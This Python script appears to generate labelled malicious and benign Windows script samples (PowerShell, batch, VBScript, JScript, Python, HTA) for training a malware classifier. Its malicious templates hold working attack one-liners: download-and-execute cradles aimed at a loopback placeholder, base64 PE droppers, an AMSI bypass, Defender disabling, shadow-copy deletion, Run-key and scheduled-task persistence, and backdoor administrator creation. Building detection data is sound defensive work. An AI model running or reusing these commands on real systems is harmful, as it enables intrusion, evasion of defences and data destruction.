#!/usr/bin/env python3
"""Generate multi-language scripts for the script model.

Public script-malware corpora are almost all PowerShell; batch, VBScript,
JScript and Python have to be built. Each template here is a real technique
written in the language's own idiom -- not a translation of one file -- so the
model learns the operation, not a spelling.

Malicious templates cover the operations the semantic table names: execute,
decode, download, write, persistence, credentials, defence tampering, and a
payload embedded as base64 that decodes to a PE header. Benign templates do the
same-looking work as an administrator would: packaging, backups, inventory,
software installation, log rotation.
"""
import base64
import os
import random
import struct

OUT = r"C:\Users\wensz\Downloads\script-ai\synthetic"

MZ_STUB = b"MZ\x90\x00\x03\x00\x00\x00" + os.urandom(120)
B64 = base64.b64encode(MZ_STUB).decode()
LONG = base64.b64encode(os.urandom(1800)).decode()


def ps_malicious(rng):
    return rng.choice([
        f"$b='{LONG}';$s=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b));iex $s",
        f"$p=[Convert]::FromBase64String('{B64}');[IO.File]::WriteAllBytes(\"$env:TEMP\\svc.exe\",$p);Start-Process \"$env:TEMP\\svc.exe\"",
        "IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1:9/a.ps1')",
        "Invoke-WebRequest 'http://127.0.0.1:9/x.zip' -OutFile $env:TEMP\\x.zip;Expand-Archive $env:TEMP\\x.zip $env:TEMP\\x -Force;Start-Process $env:TEMP\\x\\setup.exe",
        "Set-MpPreference -DisableRealtimeMonitoring $true;vssadmin delete shadows /all /quiet",
        "schtasks /create /tn Updater /tr \"powershell -w hidden -c iex(iwr http://127.0.0.1:9/a)\" /sc minute /mo 5 /f",
        "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Up /d \"cmd /c start $env:APPDATA\\svc.exe\" /f",
        "certutil -urlcache -f http://127.0.0.1:9/p.exe %TEMP%\\p.exe; start %TEMP%\\p.exe",
        "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
        "cmd /c net user backup P@ssw0rd /add && net localgroup administrators backup /add",
        "taskkill /f /im MsMpEng.exe; sc stop WinDefend",
        "wmic process call create \"powershell -w hidden -c iex(iwr http://127.0.0.1:9/a)\"",
    ])


def ps_benign(rng):
    return rng.choice([
        "Get-ChildItem -Path C:\\Logs -Filter *.log | Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-30) } | Remove-Item",
        "Get-Service | Where-Object Status -eq 'Running' | Select-Object Name, DisplayName | Export-Csv C:\\reports\\services.csv -NoTypeInformation",
        "Compress-Archive -Path C:\\Data\\* -DestinationPath C:\\Backups\\data.zip -Force",
        "Get-Process | Sort-Object WorkingSet -Descending | Select-Object -First 10 Name, WorkingSet",
        "Copy-Item C:\\Deploy\\app -Destination C:\\Apps\\app -Recurse -Force; Start-Process C:\\Apps\\app\\app.exe",
        "Get-WinEvent -LogName System -MaxEvents 100 | Where-Object LevelDisplayName -eq 'Error' | Export-Csv C:\\reports\\errors.csv",
        "Invoke-WebRequest 'https://example.com/updates/manifest.json' -OutFile C:\\Updates\\manifest.json",
        "Get-ADUser -Filter * -Properties LastLogonDate | Select-Object Name, LastLogonDate | Export-Csv C:\\reports\\users.csv",
    ])


def bat_malicious(rng):
    return rng.choice([
        "@echo off\r\npowershell -w hidden -c \"iex(iwr http://127.0.0.1:9/a)\"\r\n",
        f"@echo off\r\necho {LONG} > p.txt\r\ncertutil -decode p.txt p.exe\r\nstart \"\" p.exe\r\n",
        "@echo off\r\ntar -xf payload.tar -C %TEMP%\\t\r\nstart \"\" %TEMP%\\t\\setup.exe\r\n",
        "@echo off\r\nbitsadmin /transfer j http://127.0.0.1:9/x.exe %TEMP%\\x.exe\r\nstart \"\" %TEMP%\\x.exe\r\n",
        "@echo off\r\nreg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Up /d \"%APPDATA%\\svc.exe\" /f\r\nvssadmin delete shadows /all /quiet\r\n",
        f"@echo off\r\npowershell -enc {base64.b64encode(b'Start-Process calc.exe').decode()}\r\n",
        "@echo off\r\nnet user backup P@ssw0rd /add\r\nnet localgroup administrators backup /add\r\n",
        "@echo off\r\npowershell -w hidden -c \"$c=New-Object Net.WebClient;$c.DownloadFile(\'http://127.0.0.1:9/a.exe\',\'%TEMP%\\a.exe\');Start-Process \'%TEMP%\\a.exe\'\"\r\n",
        "@echo off\r\ncopy \\\\server\\share\\svc.exe %APPDATA%\\svc.exe\r\nreg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v S /d %APPDATA%\\svc.exe /f\r\n",
        "@echo off\r\ntaskkill /f /im MsMpEng.exe\r\nsc stop WinDefend\r\n",
        "@echo off\r\nwmic process call create \"powershell -w hidden -c iex(iwr http://127.0.0.1:9/a)\"\r\n",
        "@echo off\r\nset x=TVqQAAMAAAAEAAAA\r\necho %x%>p.b64\r\ncertutil -decode p.b64 p.exe\r\nstart p.exe\r\n",
        "@echo off\r\nmkdir %TEMP%\\t\r\ntar -xf \"%~dp0p.tar\" -C %TEMP%\\t\r\nstart \"\" %TEMP%\\t\\setup.exe\r\n",
        "@echo off\r\npowershell -c \"Get-ChildItem -Recurse $env:USERPROFILE -Include *.doc,*.xls | Remove-Item -Force\"\r\n",
        "@echo off\r\nschtasks /create /tn Updater /tr \"powershell -w hidden -c iex(iwr http://127.0.0.1:9/a)\" /sc minute /mo 5 /f\r\n",
        "@echo off\r\nreg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Up /d \"%APPDATA%\\svc.exe\" /f\r\nstart \"\" %APPDATA%\\svc.exe\r\n",
    ])


def bat_benign(rng):
    return rng.choice([
        "@echo off\r\nxcopy C:\\Data\\* C:\\Backup\\ /E /I /Y\r\n",
        "@echo off\r\nforfiles /p C:\\Logs /m *.log /d -30 /c \"cmd /c del @path\"\r\n",
        "@echo off\r\nsc query Spooler | findstr RUNNING\r\n",
        "@echo off\r\nmsiexec /i C:\\Deploy\\app.msi /qn\r\n",
    ])


def vbs_malicious(rng):
    return rng.choice([
        f"Set x=CreateObject(\"MSXml2.DOMDocument\").createElement(\"b\")\r\nx.dataType=\"bin.base64\":x.text=\"{B64}\"\r\nSet o=CreateObject(\"ADODB.Stream\"):o.Type=1:o.Open:o.Write x.nodeTypedValue:o.SaveToFile \"p.exe\",2:o.Close\r\nCreateObject(\"WScript.Shell\").Run \"p.exe\"\r\n",
        "CreateObject(\"WScript.Shell\").Run \"powershell -w hidden -c iex(iwr http://127.0.0.1:9/a)\"\r\n",
        "Set s=CreateObject(\"WScript.Shell\")\r\ns.RegWrite \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Up\", \"%APPDATA%\\svc.exe\"\r\ns.Run \"%APPDATA%\\svc.exe\"\r\n",
    ])


def vbs_benign(rng):
    return rng.choice([
        "Set fso=CreateObject(\"Scripting.FileSystemObject\")\r\nfso.CopyFile \"C:\\Data\\a.txt\", \"C:\\Backup\\a.txt\", True\r\n",
        "Set s=CreateObject(\"WScript.Shell\")\r\ns.Run \"notepad.exe C:\\reports\\log.txt\"\r\n",
        "MsgBox \"Backup complete\", 64, \"Backup\"\r\n",
    ])


def js_malicious(rng):
    return rng.choice([
        f"var x=new ActiveXObject(\"MSXml2.DOMDocument\").createElement(\"b\");x.dataType=\"bin.base64\";x.text=\"{B64}\";var o=new ActiveXObject(\"ADODB.Stream\");o.type=1;o.open();o.write(x.nodeTypedValue);o.saveToFile(\"p.exe\",2);o.close();new ActiveXObject(\"WScript.Shell\").Run(\"p.exe\");\r\n",
        "new ActiveXObject(\"WScript.Shell\").Run(\"powershell -w hidden -c iex(iwr http://127.0.0.1:9/a)\");\r\n",
        "var w=new ActiveXObject(\"WScript.Shell\");w.RegWrite(\"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\Up\",\"%APPDATA%\\\\svc.exe\");w.Run(\"%APPDATA%\\\\svc.exe\");\r\n",
    ])


def js_benign(rng):
    return rng.choice([
        "var fso=new ActiveXObject(\"Scripting.FileSystemObject\");fso.CopyFolder(\"C:\\\\Data\",\"C:\\\\Backup\\\\Data\");\r\n",
        "WScript.Echo(\"Inventory complete\");\r\n",
        "var shell=new ActiveXObject(\"WScript.Shell\");shell.Run(\"notepad.exe C:\\\\reports\\\\log.txt\");\r\n",
    ])


def py_malicious(rng):
    return rng.choice([
        f"import base64,subprocess\nopen('p.exe','wb').write(base64.b64decode('{B64}'))\nsubprocess.Popen(['p.exe'])\n",
        "import urllib.request,subprocess\nurllib.request.urlretrieve('http://127.0.0.1:9/a.exe','a.exe')\nsubprocess.Popen(['a.exe'])\n",
        f"import base64\nexec(base64.b64decode('{base64.b64encode(b'import os; os.system(\"whoami\")').decode()}'))\n",
        "import os\nos.system('vssadmin delete shadows /all /quiet')\n",
        "import os\nos.system('net user backup P@ssw0rd /add')\n",
        "import os\nos.system('taskkill /f /im MsMpEng.exe')\n",
        "import subprocess\nsubprocess.run(['wmic','process','call','create','calc.exe'])\n",
    ])


def py_benign(rng):
    return rng.choice([
        "import shutil\nshutil.make_archive('backup','zip','C:/Data')\n",
        "import subprocess\nsubprocess.run(['ipconfig','/all'])\n",
        "import json\nopen('report.json','w').write(json.dumps({'host':'pc','status':'ok'}))\n",
        "import logging\nlogging.basicConfig(filename='app.log',level=logging.INFO)\nlogging.info('started')\n",
    ])


def hta_malicious(rng):
    return "<html><script language=\"VBScript\">\r\nCreateObject(\"WScript.Shell\").Run \"powershell -w hidden -c iex(iwr http://127.0.0.1:9/a)\"\r\n</script></html>\r\n"


def hta_benign(rng):
    return "<html><body><h1>Inventory</h1><p>Host report generated.</p></body></html>\r\n"


GENERATORS = {
    ".ps1": (ps_malicious, ps_benign),
    ".bat": (bat_malicious, bat_benign),
    ".cmd": (bat_malicious, bat_benign),
    ".vbs": (vbs_malicious, vbs_benign),
    ".js": (js_malicious, js_benign),
    ".py": (py_malicious, py_benign),
    ".hta": (hta_malicious, hta_benign),
}

ENCODINGS = ["utf-8", "utf-8-sig", "utf-16"]


def main():
    rng = random.Random(7)
    os.makedirs(os.path.join(OUT, "malicious"), exist_ok=True)
    os.makedirs(os.path.join(OUT, "benign"), exist_ok=True)
    written = {"malicious": 0, "benign": 0}
    for extension, (malicious, benign) in GENERATORS.items():
        for index in range(320):
            for label, generator in (("malicious", malicious), ("benign", benign)):
                text = generator(rng)
                encoding = rng.choice(ENCODINGS)
                name = f"{label}-{extension.strip('.')}-{index:03d}{extension}"
                path = os.path.join(OUT, label, name)
                with open(path, "w", encoding=encoding, newline="") as handle:
                    handle.write(text)
                written[label] += 1
    print(written)


if __name__ == "__main__":
    main()
